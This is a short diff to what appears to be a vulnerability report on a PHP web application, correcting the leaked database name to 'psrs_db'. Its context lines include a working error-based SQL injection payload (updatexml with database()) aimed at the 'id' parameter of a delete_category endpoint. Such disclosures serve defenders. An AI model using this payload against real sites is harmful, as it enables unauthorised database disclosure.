@@ -8,7 +8,7 @@ Vulnerability File: /psrs/classes/Master.php?f=delete_category
 
 Vulnerability location: /psrs/classes/Master.php?f=delete_category, id
 
-Current database name: hsrs_db ,length is 7
+Current database name: psrs_db ,length is 7
 
 [+] Payload: id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id
 
